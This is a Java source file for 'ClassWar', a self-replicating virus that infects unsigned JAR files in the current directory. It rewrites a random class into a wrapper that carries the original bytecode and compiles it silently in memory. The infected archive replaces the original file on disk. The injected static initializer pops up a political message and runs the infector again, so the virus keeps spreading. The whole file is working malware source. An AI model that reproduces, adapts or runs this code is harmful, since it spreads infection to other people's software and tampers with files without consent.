/**
 * ClassWar
 *
 * @autor R3s1stanc3 r3s1stanc3@vbrandl.net
 */
package edu.vx;

import java.io.*;
import java.lang.annotation.Annotation;
import java.lang.reflect.*;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.text.MessageFormat;
import java.util.*;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarOutputStream;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import java.util.stream.StreamSupport;
import java.util.zip.ZipEntry;
import javax.tools.*;

public class ClassWar {
  /** Infection marker. If this file exists in a JAR file, it is infected. */
  private static final String MARKER = "doesthislookinfected?";

  private static final Pattern PACKAGE_SEPARATOR = Pattern.compile(Pattern.quote("."));
  private static final Pattern MANIFEST_SEP = Pattern.compile(Pattern.quote(": "));
  /**
   * The JAR spec defines newline as:
   *
   * <p>newline: CR LF | LF | CR (not followed by LF)
   */
  private static final Pattern LINE_SEP = Pattern.compile("(\\r?\\n|\\r)");

  // all classes from the virus itself, that start with these patterns, will be copied to the new
  // host
  private static final Set<String> MY_CLASSES =
      Collections.unmodifiableSet(
          new HashSet<>(
              Arrays.asList(
                  "edu/vx/ClassWar",
                  "edu/vx/InMemoryFileManager",
                  "edu/vx/InMemoryJavaFile",
                  "edu/vx/Pair",
                  "edu/vx/Quadruple")));

  public static void main(String args[]) throws IOException {
    if (null != System.setProperty(MARKER, "true")) {
      // the virus has been invoked already from another infected class
      return;
    }
    Path currentExe = currentExe();

    try (DirectoryStream<Path> jars =
        Files.newDirectoryStream(
            Paths.get("./"),
            p -> {
              String path = p.toString().toLowerCase();
              // only *.jar and infection candidates
              return (path.endsWith(".jar")
                  // TODO: test war and ear infection
                  // || path.endsWith(".war")
                  // || path.endsWith(".ear")
                  )
                  && isInfectionCandidate(p);
            })) {
      for (Path victim : jars) {
        try {
          String[] manifest =
              lines(
                  new String(
                      readFromArchive(victim, "META-INF/MANIFEST.MF"), StandardCharsets.UTF_8));

          boolean isSigned = readManifest(manifest, "Signature-Version") != null;
          if (isSigned) {
            // if the `Signature-Version` property exists, the JAR is signed and we should not
            // infect
            continue;
          }

          Map<String, byte[]> classes = classesFromJar(victim);
          Map<String, Pair<Class<?>, byte[]>> candidates = new HashMap<>();
          // find candidates for infection:
          // classes can have subclasses. Those are named `OuterClass$SubClass`. Classes with
          // subclasses and their subclasses should not be infected for now. The wrapper logic must
          // be updated to account for subclasses
          try (URLClassLoader cl = URLClassLoader.newInstance(new URL[] {victim.toUri().toURL()})) {
            for (Map.Entry<String, byte[]> entry : classes.entrySet()) {
              String className = entry.getKey().replace('/', '.');
              try {
                Class<?> clazz = cl.loadClass(className);
                String classWithoutAnonymous = classNameWithoutSubclass(className);
                boolean hasSubclass =
                    classes.keySet().stream()
                        .anyMatch(
                            name ->
                                !name.equals(className)
                                    && classNameWithoutSubclass(name)
                                        .equals(classWithoutAnonymous));
                if (!hasSubclass && canInfect(clazz)) {
                  candidates.put(entry.getKey(), new Pair<>(clazz, entry.getValue()));
                }
              } catch (ClassNotFoundException e) {
                continue;
              }
            }

            // try infecting random candidates until it succeeds once, then break
            for (Map.Entry<String, Pair<Class<?>, byte[]>> candidate : randomize(candidates)) {
              try {
                String infectedSource =
                    infectionWrapper(candidate.getValue().a, candidate.getValue().b, true);

                try (InMemoryFileManager fileManager =
                    compile(
                        Collections.singletonList(
                            new InMemoryJavaFile(candidate.getKey(), infectedSource)))) {

                  // compilation failed, try next candidate
                  if (fileManager == null) {
                    continue;
                  }

                  Map<String, byte[]> contents = new HashMap<>();
                  for (Map.Entry<String, JavaFileObject> entry : fileManager.storage().entrySet()) {
                    try (InputStream is = entry.getValue().openInputStream()) {
                      contents.put(entry.getKey(), readAllBytes(is));
                    }
                  }

                  // mark as infected
                  contents.put(MARKER, new byte[0]);
                  Map<Path, Iterable<String>> partialArchives = new HashMap<>();
                  partialArchives.put(currentExe, MY_CLASSES);

                  byte[] infected =
                      createJar(
                          contents,
                          Collections.singletonList(victim),
                          candidate.getValue().a.getName() + ".class",
                          partialArchives);
                  // write infected contents to a temporary file and move over to the victim to
                  // prevent
                  // destroying the victim if writing fails.
                  move(createTempFile(infected), victim);

                  // file infected; we are done
                  break;
                }
              } catch (NotImplemented ignored) {
                // try next class
              }
            }
          }
        } catch (IOException e) {
        }
      }
    }
  }

  /**
   * Checks if a file is a candidate for infection. This means no infection marker and no class
   * named as one of the virus classes in the target.
   *
   * @param archive The archive to check
   * @return
   */
  public static boolean isInfectionCandidate(Path archive) {
    File archiveFile = archive.toFile();
    if (!(archiveFile.canRead() && archiveFile.canWrite())) {
      return false;
    }
    try (JarFile jf = new JarFile(archive.toFile())) {
      for (JarEntry entry : Collections.list(jf.entries())) {
        // already infected
        if (entry.getName().contains(MARKER)
            // contains a class named like one of the virus classes
            || MY_CLASSES.stream().anyMatch(cl -> entry.getName().startsWith(cl))) {
          // not a candidate for infection
          return false;
        }
      }
    } catch (IOException e) {
      return false;
    }
    return true;
  }

  private static Path currentExe() {
    return Paths.get(System.getProperty("java.class.path")).normalize();
  }

  public static void copy(InputStream input, OutputStream output) throws IOException {
    byte[] buffer = new byte[4096 * 1024];
    int bytesRead;
    while ((bytesRead = input.read(buffer)) != -1) {
      output.write(buffer, 0, bytesRead);
    }
  }

  public static byte[] readAllBytes(InputStream is) throws IOException {
    try (ByteArrayOutputStream buffer = new ByteArrayOutputStream()) {
      copy(is, buffer);
      return buffer.toByteArray();
    }
  }

  protected static InMemoryFileManager compile(Collection<JavaFileObject> sourceFiles) {
    JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
    if (null == compiler) {
      // running on JRE. No compiler available
      return null;
    }
    InMemoryFileManager fileManager =
        new InMemoryFileManager(compiler.getStandardFileManager(null, null, null));
    try (Writer nullWriter =
        // null-writer to hide compiler output
        new Writer() {
          @Override
          public void write(char[] buf, int off, int len) {}

          @Override
          public void flush() {}

          @Override
          public void close() {}
        }) {
      JavaCompiler.CompilationTask task =
          compiler.getTask(nullWriter, fileManager, null, null, null, sourceFiles);
      return task.call() ? fileManager : null;
    } catch (IOException e) {
      return null;
    }
  }

  /**
   * Create a JAR
   *
   * @param contents map filename -> content to add to the archives
   * @param archives JARs to add completely to the new JAR
   * @param infectedFile everything except files named like the infectedFile are copied from
   *     archives
   * @param partialArchives JARs to add partially to the new JAR. Only files starting with any of
   *     the patterns in the iterable are added
   * @return
   * @throws IOException
   */
  private static byte[] createJar(
      Map<String, byte[]> contents,
      Iterable<Path> archives,
      String infectedFile,
      Map<Path, Iterable<String>> partialArchives)
      throws IOException {
    try (ByteArrayOutputStream baos = new ByteArrayOutputStream()) {
      try (JarOutputStream zos = new JarOutputStream(baos)) {
        // keep track of created entries. JarOutputStream will throw if an entry gets added twice
        for (Map.Entry<String, byte[]> content : contents.entrySet()) {
          String name = content.getKey();
          zos.putNextEntry(new JarEntry(name));
          zos.write(content.getValue());
        }
        for (Path archive : archives) {
          try (JarFile jf = new JarFile(archive.toFile())) {
            for (JarEntry oldEntry : Collections.list(jf.entries())) {
              if (!oldEntry.isDirectory() && !oldEntry.getName().equals(infectedFile)) {
                zos.putNextEntry(new JarEntry(oldEntry));
                copy(jf.getInputStream(oldEntry), zos);
              }
            }
          }
        }
        for (Map.Entry<Path, Iterable<String>> archive : partialArchives.entrySet()) {
          try (JarFile zf = new JarFile(archive.getKey().toFile())) {
            for (JarEntry oldEntry : Collections.list(zf.entries())) {
              if (!oldEntry.isDirectory()) {
                if (StreamSupport.stream(archive.getValue().spliterator(), false)
                    .anyMatch(pattern -> oldEntry.getName().startsWith(pattern))) {
                  zos.putNextEntry(new JarEntry(oldEntry));
                  copy(zf.getInputStream(oldEntry), zos);
                }
              }
            }
          }
        }
      }
      return baos.toByteArray();
    }
  }

  private static void move(Path source, Path target) throws IOException {
    try {
      Files.move(
          source, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
    } catch (AtomicMoveNotSupportedException e) {
      // if the atomic move failed, perform non-atomic move
      Files.move(source, target, StandardCopyOption.REPLACE_EXISTING);
    }
  }

  private static Path createTempFile(byte[] content) throws IOException {
    Path tempFile = Files.createTempFile("", "");
    Files.write(tempFile, content);
    return tempFile;
  }

  // only classes with only private members and public methods can be infected
  private static boolean canInfect(Class<?> target) {
    int classModifiers = target.getModifiers();
    if (Modifier.isAbstract(classModifiers) || Modifier.isInterface(classModifiers)) {
      // TODO: check if we can somehow infect interfaces or abstract classes
      // maybe it works already but it is not tested
      return false;
    }
    for (Field field : target.getDeclaredFields()) {
      // classes with non-private members cannot be infected
      if (!Modifier.isPrivate(field.getModifiers())) {
        return false;
      }
    }
    return true;
  }

  protected static String infectionWrapper(Class<?> target, byte[] classBytes) {
    return infectionWrapper(target, classBytes, false);
  }

  private static String infectionWrapper(
      Class<?> target, byte[] classBytes, boolean insertPayload) {
    Pair<String, Map<String, Pair<String, String>>> genericDeclarationAndMap = generics(target);
    Map<String, Pair<String, String>> generics = genericDeclarationAndMap.b;

    String constructors =
        Stream.of(target.getDeclaredConstructors())
            .filter(ClassWar::notPrivate)
            .map(c -> ClassWar.constructor(c, generics))
            .collect(Collectors.joining("\n"));

    String methods =
        Stream.of(target.getDeclaredMethods())
            .filter(ClassWar::notPrivate)
            .map(m -> ClassWar.method(m, generics))
            .collect(Collectors.joining("\n"));
    String interfaces =
        Stream.of(target.getGenericInterfaces())
            .map(Type::getTypeName)
            .collect(Collectors.joining(", "));
    if (!interfaces.isEmpty()) {
      interfaces = "implements " + interfaces;
    }
    String superClass = target.getGenericSuperclass().getTypeName();
    String[] packageAndClass = PACKAGE_SEPARATOR.split(target.getName());
    String className = packageAndClass[packageAndClass.length - 1];
    String packageName =
        String.join(".", Arrays.copyOf(packageAndClass, packageAndClass.length - 1));
    if (!packageName.isEmpty()) {
      packageName = "package " + packageName + ";";
    }

    String annotations = annotations(target);

    String payload =
        "static {\n"
            + "  new Thread(() -> javax.swing.JOptionPane.showMessageDialog(null, \"A spectre is haunting Europe - the spectre of communism!\")).start();\n"
            + "  new Thread(() -> {\n"
            + "    try {\n"
            + "      edu.vx.ClassWar.main(new String[0]);\n"
            + "    } catch (IOException e) { }\n"
            + "  }).start();"
            + "}\n";
    String template =
        "{0}\n"
            + "import java.lang.reflect.Constructor;\n"
            + "import java.lang.reflect.InvocationTargetException;\n"
            + "import java.lang.reflect.Method;\n"
            + "import java.io.IOException;\n"
            + "{1}\n"
            + "{2} class {3}{4} extends {5} {6} '{'\n"
            + "private static final String CLASS_NAME = \"{7}\";\n"
            + "private static final byte[] CLASS_BYTES = new byte[] '{' {8} '}';\n"
            + "private static final Class<?> CLASS;\n"
            + "static '{'\n"
            + "  try '{'\n"
            + "    ClassLoader cl = new ByteClassLoader(CLASS_NAME, CLASS_BYTES);\n"
            + "    CLASS = cl.loadClass(CLASS_NAME);\n"
            + "  '}' catch (ClassNotFoundException e) '{'\n"
            + "    throw new RuntimeException(e);\n"
            + "  '}'\n"
            + "'}'\n"
            + "private final Object delegate;\n"
            + "{9}\n"
            + "{10}\n"
            + "private static class ByteClassLoader extends ClassLoader '{'\n"
            + "  public ByteClassLoader(String className, byte[] classBytes) '{'\n"
            + "    super();\n"
            + "    this.defineClass(className, classBytes, 0, classBytes.length);\n"
            + "  '}'\n"
            + "'}'\n"
            + "{11}"
            + "'}'";
    return MessageFormat.format(
        template,
        packageName,
        annotations,
        Modifier.toString(target.getModifiers()),
        className,
        genericDeclarationAndMap.a,
        superClass,
        interfaces,
        target.getName(),
        // TODO: we could morph how the bytes are stored
        Arrays.toString(classBytes).replace("[", "").replace("]", ""),
        constructors,
        methods,
        insertPayload ? payload : "");
  }

  private static boolean notPrivate(Executable exec) {
    return !Modifier.isPrivate(exec.getModifiers());
  }

  private static String exceptions(Executable exec) {
    List<String> exceptions = new ArrayList<>();
    for (AnnotatedType annotatedExceptionType : exec.getAnnotatedExceptionTypes()) {
      String annotations = annotations(annotatedExceptionType);
      String bound;
      if (annotations == null || annotations.isEmpty()) {
        bound = annotatedExceptionType.getType().getTypeName();
      } else {
        String[] packagePath =
            PACKAGE_SEPARATOR.split(annotatedExceptionType.getType().getTypeName());
        String start = String.join(".", Arrays.copyOf(packagePath, packagePath.length - 1));
        bound = start + "." + annotations + " " + packagePath[packagePath.length - 1];
      }
      exceptions.add(bound);
    }
    return exceptions.isEmpty() ? "" : " throws " + String.join(", ", exceptions);
  }

  private static String exceptionHandling(
      Executable exec, Map<String, Pair<String, String>> genericsParam) {
    Class<?>[] exceptionTypes = exec.getExceptionTypes();

    // sorting the exception types from most concrete to most generic. Otherwise, we might check
    // `instanceof Exception` first, which is always true
    Arrays.sort(
        exceptionTypes,
        (a, b) -> {
          if (a.equals(b)) {
            return 0;
          } else if (a.isAssignableFrom(b)) {
            // A x = b;
            return 1;
          } else if (b.isAssignableFrom(a)) {
            // B x = a
            return -1;
          } else {
            // no common superclass or interface
            return 0;
          }
        });
    return "    Throwable targetException = e.getTargetException();\n"
        + Stream.of(exceptionTypes)
            .map(Class::getName)
            .map(
                t -> {
                  String exType =
                      genericsParam.entrySet().stream()
                          .filter(e -> e.getValue().b.endsWith(t))
                          .findFirst()
                          .map(Map.Entry::getKey)
                          .orElse(t);
                  return "if (targetException instanceof "
                      + t
                      + ") throw ("
                      + exType
                      + ") targetException;";
                })
            .collect(Collectors.joining("\n"))
        + "\n    throw new RuntimeException(e);\n";
  }

  private static Map<String, byte[]> classesFromJar(Path jar) throws IOException {
    try (JarFile jf = new JarFile(jar.toFile())) {
      Map<String, byte[]> result = new HashMap<>();
      for (JarEntry entry : Collections.list(jf.entries())) {
        if (entry.getName().endsWith(".class")) {
          try (ByteArrayOutputStream os = new ByteArrayOutputStream();
              InputStream is = jf.getInputStream(entry)) {
            copy(is, os);
            String className = entry.getName();
            className = className.substring(0, className.length() - ".class".length());
            result.put(className, os.toByteArray());
          }
        }
      }
      return result;
    }
  }

  private static <K, V> List<Map.Entry<K, V>> randomize(Map<K, V> map) {
    List<Map.Entry<K, V>> result = new ArrayList<>(map.entrySet());
    Collections.shuffle(result);
    return result;
  }

  private static String classNameWithoutSubclass(String className) {
    String normalized = className.replace('/', '.');
    int index = normalized.indexOf('$');
    if (index != -1) {
      normalized = normalized.substring(0, index);
    }
    if (normalized.endsWith(".class")) {
      normalized = normalized.substring(0, normalized.length() - ".class".length());
    }
    return normalized;
  }

  protected static String annotations(AnnotatedElement elem) {
    return Stream.of(elem.getDeclaredAnnotations())
        .map(ClassWar::annotation)
        .collect(Collectors.joining(" "));
  }

  private static String annotation(Annotation ann) {
    String annotation = "@" + ann.annotationType().getName().replace('$', '.') + "(";
    List<String> attributes = new ArrayList<>();
    for (Method method : ann.annotationType().getDeclaredMethods()) {
      try {
        Object value = method.invoke(ann);
        String valueStr = encodeAnnotationValue(value);
        attributes.add(method.getName() + "=" + valueStr);
      } catch (IllegalAccessException | InvocationTargetException e) {
        continue;
      }
    }
    annotation += String.join(", ", attributes) + ")";
    return annotation;
  }

  private static String encodeAnnotationValue(Object value) {
    if (value instanceof Object[]) {
      return "{"
          + Stream.of((Object[]) value)
              .map(ClassWar::encodeAnnotationValue)
              .collect(Collectors.joining(", "))
          + "}";
    } else if (value instanceof String) {
      return "\"" + escape((String) value) + "\"";
    } else if (value instanceof Enum<?>) {
      String name = ((Enum<?>) value).name();
      String clazz = ((Enum<?>) value).getDeclaringClass().getName().replace('$', '.');
      return clazz + "." + name;
    } else if (value instanceof Annotation) {
      return annotation((Annotation) value);
    } else if (value instanceof Class<?>) {
      return ((Class<?>) value).getName() + ".class";
    } else {
      return value.toString();
    }
  }

  // chars to be escape taken from
  // https://docs.oracle.com/javase/tutorial/java/data/characters.html
  private static String escape(String input) {
    return input
        .replace("\\", "\\\\")
        .replace("\t", "\\t")
        .replace("\b", "\\b")
        .replace("\n", "\\n")
        .replace("\r", "\\r")
        .replace("\f", "\\f")
        .replace("\"", "\\\"");
  }

  private static String[] lines(String input) {
    return LINE_SEP.split(input);
  }

  private static byte[] readFromArchive(Path archive, String file) throws IOException {
    try (JarFile jf = new JarFile(archive.toFile())) {
      ZipEntry entry = jf.getEntry(file);
      try (InputStream is = jf.getInputStream(entry)) {
        return readAllBytes(is);
      }
    }
  }

  private static String readManifest(String[] lines, String key) {
    for (String line : lines) {
      String[] keyValue = MANIFEST_SEP.split(line, 2);
      // keys are case-insensitive
      if (keyValue.length == 2 && keyValue[0].equalsIgnoreCase(key)) {
        return String.join(": ", keyValue[1]);
      }
    }
    return null;
  }

  private static String removeGenericsFromClass(String input) {
    int idx = input.indexOf('<');
    return idx == -1 ? input : input.substring(0, idx);
  }

  private static String method(Method m, Map<String, Pair<String, String>> generics) {
    String returnDecl = m.getAnnotatedReturnType().getType().getTypeName();
    Quadruple<String, List<String>, List<Pair<String, String>>, String> prototypeAndParams =
        methodOrCtor(m, returnDecl + " " + m.getName(), generics);

    String paramClasses =
        prototypeAndParams.c.stream()
            .map(p -> p.b)
            .map(ClassWar::removeGenericsFromClass)
            .map(s -> s + ".class")
            .collect(Collectors.joining(", "));
    if (!paramClasses.isEmpty()) {
      paramClasses = ", " + paramClasses;
    }

    String paramNamesWithCast =
        prototypeAndParams.b.stream().map(s -> "(Object) " + s).collect(Collectors.joining(", "));
    if (!paramNamesWithCast.isEmpty()) {
      paramNamesWithCast = ", " + paramNamesWithCast;
    }

    String template =
        "{0} '{'\n"
            + "  try '{'\n"
            + "    Method method = CLASS.getMethod(\"{1}\"{2});\n"
            + "    {3} method.invoke({4}{5});\n"
            + "  '}' catch (NoSuchMethodException | IllegalAccessException e) '{'\n"
            + "    throw new RuntimeException(e);\n"
            + "  '}' catch (InvocationTargetException e) '{'\n"
            + "    {6}\n"
            + "  '}'\n"
            + "'}'";

    String returns =
        m.getReturnType().equals(void.class)
            ? ""
            : "return (" + m.getGenericReturnType().getTypeName() + ") ";

    return MessageFormat.format(
        template,
        prototypeAndParams.a,
        m.getName(),
        paramClasses,
        returns,
        Modifier.isStatic(m.getModifiers()) ? "null" : "this.delegate",
        paramNamesWithCast,
        prototypeAndParams.d);
  }

  private static String constructor(
      Constructor<?> ctor, Map<String, Pair<String, String>> generics) {
    String[] packageAndName = PACKAGE_SEPARATOR.split(ctor.getName());
    String ctorName = packageAndName[packageAndName.length - 1];

    Quadruple<String, List<String>, List<Pair<String, String>>, String> prototypeAndParams =
        methodOrCtor(ctor, ctorName, generics);

    String paramClasses =
        prototypeAndParams.c.stream()
            .map(p -> p.b)
            .map(ClassWar::removeGenericsFromClass)
            .map(c -> c + ".class")
            .collect(Collectors.joining(", "));
    String paramNames =
        prototypeAndParams.b.stream().map(n -> "(Object) " + n).collect(Collectors.joining(", "));

    String template =
        "{0} '{'\n"
            + "  try '{'\n"
            + "    Constructor<?> ctor = CLASS.getDeclaredConstructor({1});\n"
            + "    this.delegate = ctor.newInstance({2});\n"
            + "  '}' catch (NoSuchMethodException | InstantiationException | IllegalAccessException e) '{'\n"
            + "    throw new RuntimeException(e);\n"
            + "  '}' catch (InvocationTargetException e) '{'\n"
            + "    {3}\n"
            + "  '}'\n"
            + "'}'";

    return MessageFormat.format(
        template, prototypeAndParams.a, paramClasses, paramNames, prototypeAndParams.d);
  }

  private static Pair<String, Map<String, Pair<String, String>>> generics(
      GenericDeclaration genDec) {
    return generics(genDec, new HashMap<>());
  }

  private static Pair<String, Map<String, Pair<String, String>>> generics(
      GenericDeclaration genDec, Map<String, Pair<String, String>> genericsParam) {
    // clone the generics map, so we can temporarily add new generic types for this method or
    // constructor
    Map<String, Pair<String, String>> generics = new HashMap<>(genericsParam);
    List<String> typeParameters = new ArrayList<>();
    for (TypeVariable<?> typeParameter : genDec.getTypeParameters()) {
      String genericAnnotation = ClassWar.annotations(typeParameter);
      String definition = typeParameter.getName();
      Pair<String, String> annotationAndBound;
      AnnotatedType[] bounds = typeParameter.getAnnotatedBounds();
      if (bounds.length == 0) {
        annotationAndBound = new Pair<>(null, "Object");
      } else if (bounds.length == 1) {
        annotationAndBound =
            new Pair<>(ClassWar.annotations(bounds[0]), bounds[0].getType().getTypeName());
      } else {
        throw new ClassWar.NotImplemented();
      }
      generics.put(definition, annotationAndBound);
      String bound;
      if (annotationAndBound.a == null) {
        bound = annotationAndBound.b;
      } else {
        String[] packagePath = PACKAGE_SEPARATOR.split(annotationAndBound.b);
        String start = String.join(".", Arrays.copyOf(packagePath, packagePath.length - 1));
        bound = start + "." + annotationAndBound.a + " " + packagePath[packagePath.length - 1];
      }
      typeParameters.add(
          genericAnnotation
              + (genericAnnotation.isEmpty() ? "" : " ")
              + definition
              + " extends "
              + bound);
    }
    return new Pair<>(joinAndWrap("<", typeParameters, ", ", ">"), generics);
  }

  private static Quadruple<String, List<String>, List<Pair<String, String>>, String> methodOrCtor(
      Executable exec, String returnAndName, Map<String, Pair<String, String>> genericsParam) {
    Pair<String, Map<String, Pair<String, String>>> genericDefinitionAndMap =
        generics(exec, genericsParam);
    Map<String, Pair<String, String>> generics = genericDefinitionAndMap.b;

    String returnAnnotations = annotations(exec.getAnnotatedReturnType());

    List<String> paramDecl = new ArrayList<>();
    List<String> paramNames = new ArrayList<>();
    List<Pair<String, String>> paramClasses = new ArrayList<>();
    int paramCounter = 0;
    for (AnnotatedType a : exec.getAnnotatedParameterTypes()) {
      String annotations = ClassWar.annotations(a);
      String paramName = "p" + paramCounter;
      paramDecl.add(
          (annotations.isEmpty() ? "" : annotations + " ")
              + a.getType().getTypeName()
              + " "
              + paramName);
      paramNames.add(paramName);

      String paramClass = a.getType().getTypeName();
      paramClasses.add(generics.getOrDefault(paramClass, new Pair<>(null, paramClass)));

      paramCounter += 1;
    }
    String params = String.join(", ", paramDecl);
    String exceptions = exceptions(exec);

    String exceptionHandling = exceptionHandling(exec, generics);

    return new Quadruple<>(
        Modifier.toString(exec.getModifiers())
            + " "
            + genericDefinitionAndMap.a
            + (returnAnnotations.isEmpty() ? "" : " " + returnAnnotations)
            + " "
            + returnAndName
            + "("
            + params
            + ")"
            + exceptions,
        paramNames,
        paramClasses,
        exceptionHandling);
  }

  private static String joinAndWrap(
      String lParen, Iterable<? extends CharSequence> values, String separator, String rParen) {
    String joined = String.join(separator, values);
    return joined.isEmpty() ? "" : lParen + joined + rParen;
  }

  static class NotImplemented extends RuntimeException {}
}
